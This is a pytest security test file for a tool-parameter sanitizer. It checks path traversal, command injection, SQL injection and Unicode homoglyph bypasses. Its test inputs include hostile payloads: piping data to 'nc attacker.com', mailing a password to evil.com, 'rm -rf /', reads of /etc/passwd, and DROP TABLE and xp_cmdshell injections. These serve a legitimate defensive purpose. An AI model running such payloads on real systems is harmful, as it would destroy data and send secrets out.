"""
Comprehensive tests for tool parameter sanitization (P0 Security).

Tests cover:
- Path traversal prevention
- Command injection prevention
- SQL injection prevention
- Input validation (length, range, type)
- OWASP attack payloads
"""
import os
import tempfile
from pathlib import Path

import pytest

from src.tools.base import ParameterSanitizer, SecurityError


class TestPathTraversalPrevention:
    """Tests for path traversal attack prevention."""

    def test_sanitize_path_basic_valid_path(self):
        """Test sanitizing a valid basic path."""
        sanitizer = ParameterSanitizer()
        result = sanitizer.sanitize_path("test.txt")
        assert "test.txt" in result
        assert os.path.isabs(result)  # Should be absolute

    def test_sanitize_path_blocks_dotdot_traversal(self):
        """Test blocking ../ path traversal."""
        sanitizer = ParameterSanitizer()

        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "test/../../../etc/passwd",
            "./../../etc/passwd",
        ]

        for path in malicious_paths:
            with pytest.raises(SecurityError, match="Path traversal detected"):
                sanitizer.sanitize_path(path)

    def test_sanitize_path_blocks_absolute_paths_outside_base(self):
        """Test blocking absolute paths outside allowed base."""
        sanitizer = ParameterSanitizer()

        with tempfile.TemporaryDirectory() as tmpdir:
            # Try to access /etc/passwd from temp directory base
            with pytest.raises(SecurityError, match="outside"):
                sanitizer.sanitize_path("/etc/passwd", allowed_base=tmpdir)

            # Try to access /tmp from a different base
            with pytest.raises(SecurityError, match="outside"):
                sanitizer.sanitize_path("/tmp/test", allowed_base=tmpdir)

    def test_sanitize_path_blocks_null_bytes(self):
        """Test blocking null byte injection."""
        sanitizer = ParameterSanitizer()

        malicious_paths = [
            "test\x00.txt",
            "file.txt\x00/../../../etc/passwd",
            "\x00etc/passwd",
        ]

        for path in malicious_paths:
            with pytest.raises(SecurityError, match="Null bytes"):
                sanitizer.sanitize_path(path)

    def test_sanitize_path_allows_within_base(self):
        """Test allowing valid paths within base directory."""
        sanitizer = ParameterSanitizer()

        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a test file
            test_file = os.path.join(tmpdir, "test.txt")
            Path(test_file).touch()

            # Should allow accessing file within base
            result = sanitizer.sanitize_path(test_file, allowed_base=tmpdir)
            assert tmpdir in result
            assert "test.txt" in result

            # Should allow subdirectories
            subdir = os.path.join(tmpdir, "subdir", "file.txt")
            os.makedirs(os.path.dirname(subdir), exist_ok=True)
            result = sanitizer.sanitize_path(subdir, allowed_base=tmpdir)
            assert tmpdir in result

    def test_sanitize_path_empty_path_raises_error(self):
        """Test that empty path raises ValueError."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(ValueError, match="cannot be empty"):
            sanitizer.sanitize_path("")

    def test_sanitize_path_normalizes_path(self):
        """Test that paths are normalized."""
        sanitizer = ParameterSanitizer()

        # Path with redundant separators
        result = sanitizer.sanitize_path("./test//file.txt")
        # Should be normalized (no ./ or //)
        assert result == str(Path("./test//file.txt").resolve())

    def test_sanitize_path_owasp_payloads(self):
        """Test against OWASP path traversal payloads."""
        sanitizer = ParameterSanitizer()

        # OWASP top path traversal payloads with actual .. components
        owasp_payloads = [
            "../",
            "..\\",
            "../../../",
            "..\\..\\..\\",
        ]

        for payload in owasp_payloads:
            with pytest.raises(SecurityError):
                sanitizer.sanitize_path(payload)

    def test_sanitize_path_url_encoded_should_be_decoded_first(self):
        """Test that URL-encoded paths should be decoded before sanitization."""
        sanitizer = ParameterSanitizer()

        # Note: URL-encoded paths like ..%2F should be decoded by the web framework
        # before reaching the sanitizer. We document this behavior here.
        # The sanitizer works on already-decoded strings.

        # These URL-encoded payloads won't be caught unless pre-decoded
        url_encoded_payloads = [
            "..%2F",      # URL-encoded ../
            "..%5C",      # URL-encoded ..\
            "%2e%2e%2f",  # Fully encoded ../
        ]

        # These pass through because they don't contain literal ".."
        # Application should decode URLs before sanitization
        for payload in url_encoded_payloads:
            # Should NOT raise (needs pre-decoding)
            result = sanitizer.sanitize_path(payload)
            assert result  # Just verify it doesn't crash


class TestCommandInjectionPrevention:
    """Tests for command injection attack prevention."""

    def test_sanitize_command_basic_valid_command(self):
        """Test sanitizing a valid command."""
        sanitizer = ParameterSanitizer()

        valid_commands = [
            "ls",
            "echo hello",
            "python script.py",
            "cat file.txt",
        ]

        for cmd in valid_commands:
            result = sanitizer.sanitize_command(cmd)
            assert result == cmd

    def test_sanitize_command_blocks_semicolon_injection(self):
        """Test blocking semicolon command separator."""
        sanitizer = ParameterSanitizer()

        malicious_commands = [
            "ls; rm -rf /",
            "echo test; cat /etc/passwd",
            "command1; command2; command3",
        ]

        for cmd in malicious_commands:
            with pytest.raises(SecurityError, match="Dangerous character ';'"):
                sanitizer.sanitize_command(cmd)

    def test_sanitize_command_blocks_pipe_injection(self):
        """Test blocking pipe operator."""
        sanitizer = ParameterSanitizer()

        malicious_commands = [
            "cat file | nc attacker.com 1234",
            "ls | grep secret",
            "echo password | mail attacker@evil.com",
        ]

        for cmd in malicious_commands:
            with pytest.raises(SecurityError, match="Dangerous character '|'"):
                sanitizer.sanitize_command(cmd)

    def test_sanitize_command_blocks_ampersand_injection(self):
        """Test blocking ampersand operators."""
        sanitizer = ParameterSanitizer()

        malicious_commands = [
            ("ls && rm -rf /", "&"),
            ("echo test & malicious_command", "&"),
            ("command1 || command2", "|"),  # || contains |, detected by pipe check
        ]

        for cmd, expected_char in malicious_commands:
            with pytest.raises(SecurityError, match=f"Dangerous character '\\{expected_char}'"):
                sanitizer.sanitize_command(cmd)

    def test_sanitize_command_blocks_backticks(self):
        """Test blocking backtick command substitution."""
        sanitizer = ParameterSanitizer()

        malicious_commands = [
            "echo `whoami`",
            "ls `cat /etc/passwd`",
            "`malicious_command`",
        ]

        for cmd in malicious_commands:
            with pytest.raises(SecurityError, match="Dangerous character '`'"):
                sanitizer.sanitize_command(cmd)

    def test_sanitize_command_blocks_dollar_sign(self):
        """Test blocking dollar sign variable expansion."""
        sanitizer = ParameterSanitizer()

        malicious_commands = [
            "echo $(whoami)",
            "ls $HOME",
            "cat ${SECRET_FILE}",
        ]

        for cmd in malicious_commands:
            with pytest.raises(SecurityError, match="Dangerous character '\\$'"):
                sanitizer.sanitize_command(cmd)

    def test_sanitize_command_blocks_newline_injection(self):
        """Test blocking newline injection."""
        sanitizer = ParameterSanitizer()

        malicious_commands = [
            "echo test\nrm -rf /",
            "command\nmalicious_line",
            "safe\r\nevil",
        ]

        for cmd in malicious_commands:
            with pytest.raises(SecurityError):
                sanitizer.sanitize_command(cmd)

    def test_sanitize_command_blocks_redirection(self):
        """Test blocking output/input redirection."""
        sanitizer = ParameterSanitizer()

        malicious_commands = [
            "echo secret > /tmp/leak.txt",
            "cat /etc/passwd > attacker_file",
            "command < malicious_input",
        ]

        for cmd in malicious_commands:
            with pytest.raises(SecurityError, match="Dangerous character"):
                sanitizer.sanitize_command(cmd)

    def test_sanitize_command_whitelist_enforcement(self):
        """Test command whitelist enforcement."""
        sanitizer = ParameterSanitizer()

        allowed = ["ls", "cat", "echo"]

        # Allowed commands should pass
        assert sanitizer.sanitize_command("ls -la", allowed_commands=allowed) == "ls -la"
        assert sanitizer.sanitize_command("cat file.txt", allowed_commands=allowed) == "cat file.txt"

        # Disallowed commands should fail
        with pytest.raises(SecurityError, match="not in allowed list"):
            sanitizer.sanitize_command("rm -rf /", allowed_commands=allowed)

        with pytest.raises(SecurityError, match="not in allowed list"):
            sanitizer.sanitize_command("python script.py", allowed_commands=allowed)

    def test_sanitize_command_empty_command_raises_error(self):
        """Test that empty command raises ValueError."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(ValueError, match="cannot be empty"):
            sanitizer.sanitize_command("")

    def test_sanitize_command_owasp_payloads(self):
        """Test against OWASP command injection payloads."""
        sanitizer = ParameterSanitizer()

        # OWASP top command injection payloads
        owasp_payloads = [
            "; ls",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(uname -a)",
            "\n malicious",
        ]

        for payload in owasp_payloads:
            with pytest.raises(SecurityError):
                sanitizer.sanitize_command(payload)


class TestSQLInjectionPrevention:
    """Tests for SQL injection attack prevention."""

    def test_sanitize_sql_valid_input(self):
        """Test sanitizing valid SQL input."""
        sanitizer = ParameterSanitizer()

        valid_inputs = [
            "user123",
            "john.doe@example.com",
            "Product Name",
            "12345",
        ]

        for input_val in valid_inputs:
            result = sanitizer.sanitize_sql_input(input_val)
            assert result == input_val

    def test_sanitize_sql_blocks_union_injection(self):
        """Test blocking UNION-based SQL injection."""
        sanitizer = ParameterSanitizer()

        malicious_inputs = [
            "user' UNION SELECT * FROM users--",
            "1 UNION ALL SELECT password FROM accounts",
            "test UNION SELECT NULL,NULL,NULL",
        ]

        for input_val in malicious_inputs:
            with pytest.raises(SecurityError, match="SQL injection"):
                sanitizer.sanitize_sql_input(input_val)

    def test_sanitize_sql_blocks_comment_injection(self):
        """Test blocking SQL comment injection."""
        sanitizer = ParameterSanitizer()

        malicious_inputs = [
            "admin'--",
            "user'; DROP TABLE users;--",
            "input /* comment */ malicious",
        ]

        for input_val in malicious_inputs:
            with pytest.raises(SecurityError, match="SQL injection"):
                sanitizer.sanitize_sql_input(input_val)

    def test_sanitize_sql_blocks_boolean_injection(self):
        """Test blocking boolean-based SQL injection."""
        sanitizer = ParameterSanitizer()

        malicious_inputs = [
            "' OR '1'='1",
            "admin' OR 1=1--",
            "user' AND '1'='1",
            "test' OR 'a'='a",
        ]

        for input_val in malicious_inputs:
            with pytest.raises(SecurityError, match="SQL injection"):
                sanitizer.sanitize_sql_input(input_val)

    def test_sanitize_sql_blocks_stacked_queries(self):
        """Test blocking stacked query injection."""
        sanitizer = ParameterSanitizer()

        malicious_inputs = [
            "user'; DROP TABLE users;",
            "input'; DELETE FROM accounts;",
            "test'; UPDATE users SET password='hacked';",
        ]

        for input_val in malicious_inputs:
            with pytest.raises(SecurityError, match="SQL injection"):
                sanitizer.sanitize_sql_input(input_val)

    def test_sanitize_sql_blocks_stored_procedure_calls(self):
        """Test blocking stored procedure execution."""
        sanitizer = ParameterSanitizer()

        malicious_inputs = [
            "'; EXEC xp_cmdshell 'dir';--",
            "user'; EXECUTE sp_executesql;--",
            "'; xp_regread 'HKEY_LOCAL_MACHINE';",
        ]

        for input_val in malicious_inputs:
            with pytest.raises(SecurityError, match="SQL injection"):
                sanitizer.sanitize_sql_input(input_val)

    def test_sanitize_sql_allows_non_string_types(self):
        """Test that non-string types pass through."""
        sanitizer = ParameterSanitizer()

        # Integers and other types should pass through unchanged
        assert sanitizer.sanitize_sql_input(123) == 123
        assert sanitizer.sanitize_sql_input(None) is None
        assert sanitizer.sanitize_sql_input(True) is True


class TestInputValidation:
    """Tests for general input validation."""

    def test_validate_string_length_valid(self):
        """Test validating string within length limit."""
        sanitizer = ParameterSanitizer()

        result = sanitizer.validate_string_length("test", max_length=100)
        assert result == "test"

        result = sanitizer.validate_string_length("x" * 99, max_length=100)
        assert len(result) == 99

    def test_validate_string_length_exceeds_limit(self):
        """Test rejecting strings that exceed max length."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(ValueError, match="too long"):
            sanitizer.validate_string_length("x" * 1001, max_length=1000)

        with pytest.raises(ValueError, match="too long"):
            sanitizer.validate_string_length("a" * 10001, max_length=10000)

    def test_validate_string_length_custom_param_name(self):
        """Test custom parameter name in error messages."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(ValueError, match="username"):
            sanitizer.validate_string_length("x" * 1001, max_length=1000, param_name="username")

    def test_validate_string_length_type_error(self):
        """Test type error for non-string input."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(TypeError, match="expected string"):
            sanitizer.validate_string_length(123, max_length=100)

        with pytest.raises(TypeError, match="expected string"):
            sanitizer.validate_string_length([1, 2, 3], max_length=100)

    def test_validate_integer_range_valid(self):
        """Test validating integer within range."""
        sanitizer = ParameterSanitizer()

        result = sanitizer.validate_integer_range(50, minimum=0, maximum=100)
        assert result == 50

        result = sanitizer.validate_integer_range(0, minimum=0, maximum=100)
        assert result == 0

        result = sanitizer.validate_integer_range(100, minimum=0, maximum=100)
        assert result == 100

    def test_validate_integer_range_below_minimum(self):
        """Test rejecting integers below minimum."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(ValueError, match="below minimum"):
            sanitizer.validate_integer_range(-1, minimum=0, maximum=100)

        with pytest.raises(ValueError, match="below minimum"):
            sanitizer.validate_integer_range(-100, minimum=-10, maximum=10)

    def test_validate_integer_range_above_maximum(self):
        """Test rejecting integers above maximum."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(ValueError, match="above maximum"):
            sanitizer.validate_integer_range(101, minimum=0, maximum=100)

        with pytest.raises(ValueError, match="above maximum"):
            sanitizer.validate_integer_range(1000, minimum=0, maximum=100)

    def test_validate_integer_range_type_error(self):
        """Test type error for non-integer input."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(TypeError, match="expected integer"):
            sanitizer.validate_integer_range("123", minimum=0, maximum=100)

        with pytest.raises(TypeError, match="expected integer"):
            sanitizer.validate_integer_range(12.5, minimum=0, maximum=100)

        # Boolean should be rejected (even though it's technically int subclass)
        with pytest.raises(TypeError, match="expected integer"):
            sanitizer.validate_integer_range(True, minimum=0, maximum=100)

    def test_validate_integer_range_no_limits(self):
        """Test validation with no minimum or maximum."""
        sanitizer = ParameterSanitizer()

        # Should accept any integer
        assert sanitizer.validate_integer_range(-1000) == -1000
        assert sanitizer.validate_integer_range(0) == 0
        assert sanitizer.validate_integer_range(1000) == 1000

    def test_validate_integer_range_custom_param_name(self):
        """Test custom parameter name in error messages."""
        sanitizer = ParameterSanitizer()

        with pytest.raises(ValueError, match="age"):
            sanitizer.validate_integer_range(150, minimum=0, maximum=120, param_name="age")


class TestCommandInjectionUnicodeHomoglyphs:
    """Tests for Unicode homoglyph bypass prevention."""

    def test_blocks_fullwidth_semicolon(self):
        """U+FF1B (fullwidth semicolon) is normalized and blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Dangerous character ';'"):
            sanitizer.sanitize_command("ls\uff1b rm -rf /")

    def test_blocks_fullwidth_pipe(self):
        """U+FF5C (fullwidth vertical bar) is normalized and blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Dangerous character '|'"):
            sanitizer.sanitize_command("cat file\uff5c nc attacker.com 1234")

    def test_blocks_fullwidth_ampersand(self):
        """U+FF06 (fullwidth ampersand) is normalized and blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Dangerous character '&'"):
            sanitizer.sanitize_command("echo test\uff06 malicious")

    def test_blocks_fullwidth_dollar(self):
        """U+FF04 (fullwidth dollar sign) is normalized and blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Dangerous character '\\$'"):
            sanitizer.sanitize_command("echo \uff04(whoami)")

    def test_blocks_fullwidth_backtick(self):
        """U+FF40 (fullwidth grave accent) is normalized and blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Dangerous character '`'"):
            sanitizer.sanitize_command("echo \uff40whoami\uff40")

    def test_blocks_fullwidth_greater_than(self):
        """U+FF1E (fullwidth greater-than) is normalized and blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Dangerous character '>'"):
            sanitizer.sanitize_command("echo secret \uff1e /tmp/leak")

    def test_blocks_fullwidth_less_than(self):
        """U+FF1C (fullwidth less-than) is normalized and blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Dangerous character '<'"):
            sanitizer.sanitize_command("command \uff1c input")

    def test_mixed_ascii_and_unicode_normalized(self):
        """Mixed ASCII + Unicode homoglyphs are caught after normalization."""
        sanitizer = ParameterSanitizer()
        # Fullwidth semicolon between normal ASCII commands
        with pytest.raises(SecurityError):
            sanitizer.sanitize_command("safe_cmd\uff1b evil_cmd")

    def test_safe_command_with_unicode_letters_passes(self):
        """Commands with non-dangerous Unicode characters should pass."""
        sanitizer = ParameterSanitizer()
        # These Unicode chars don't normalize to dangerous ASCII
        result = sanitizer.sanitize_command("echo hello")
        assert result == "echo hello"


class TestCommandInjectionNullBytes:
    """Tests for null byte injection prevention."""

    def test_blocks_null_byte_in_command(self):
        """Null byte in command is blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Null byte"):
            sanitizer.sanitize_command("cmd\x00malicious")

    def test_blocks_null_byte_at_start(self):
        """Null byte at start of command is blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Null byte"):
            sanitizer.sanitize_command("\x00ls")

    def test_blocks_null_byte_at_end(self):
        """Null byte at end of command is blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError, match="Null byte"):
            sanitizer.sanitize_command("ls\x00")


class TestCommandInjectionPatterns:
    """Tests for command substitution and expansion patterns."""

    def test_blocks_command_substitution_dollar_paren(self):
        """$(cmd) command substitution is blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError):
            sanitizer.sanitize_command("ls $(whoami)")

    def test_blocks_variable_expansion_dollar_brace(self):
        """${var} variable expansion is blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError):
            sanitizer.sanitize_command("ls ${HOME}")

    def test_blocks_brace_expansion(self):
        """{a,b} brace expansion is blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError):
            sanitizer.sanitize_command("ls {a,b,c}")

    def test_blocks_brace_range_expansion(self):
        """{1..10} brace range expansion is blocked."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(SecurityError):
            sanitizer.sanitize_command("echo {1..10}")


class TestCommandLengthEnforcement:
    """Tests for command length limits."""

    def test_blocks_command_exceeding_default_limit(self):
        """Commands exceeding default max length are rejected."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(ValueError, match="Command too long"):
            sanitizer.sanitize_command("a" * 1001)

    def test_blocks_command_exceeding_custom_limit(self):
        """Commands exceeding custom max length are rejected."""
        sanitizer = ParameterSanitizer()
        with pytest.raises(ValueError, match="Command too long"):
            sanitizer.sanitize_command("a" * 51, max_length=50)

    def test_allows_command_within_limit(self):
        """Commands within length limit pass."""
        sanitizer = ParameterSanitizer()
        result = sanitizer.sanitize_command("ls -la", max_length=100)
        assert result == "ls -la"


class TestSecurityErrorMessages:
    """Tests for security error message quality."""

    def test_error_messages_include_context(self):
        """Test that error messages include helpful context."""
        sanitizer = ParameterSanitizer()

        # Path traversal should mention the dangerous path
        try:
            sanitizer.sanitize_path("../../etc/passwd")
        except SecurityError as e:
            assert "Path traversal" in str(e)
            assert ".." in str(e)

        # Command injection should mention the dangerous character
        try:
            sanitizer.sanitize_command("ls; rm -rf /")
        except SecurityError as e:
            assert "Dangerous character" in str(e)
            assert ";" in str(e)

        # SQL injection should mention the pattern
        try:
            sanitizer.sanitize_sql_input("' OR '1'='1")
        except SecurityError as e:
            assert "SQL injection" in str(e)

    def test_error_messages_dont_leak_secrets(self):
        """Test that error messages don't leak sensitive data."""
        sanitizer = ParameterSanitizer()

        # Error message should not include the full malicious input
        # (to avoid logging attacks in plaintext)
        try:
            sanitizer.sanitize_command("echo super_secret_password; rm -rf /")
        except SecurityError as e:
            error_msg = str(e)
            # Should mention dangerous character but not full command
            assert "Dangerous character" in error_msg
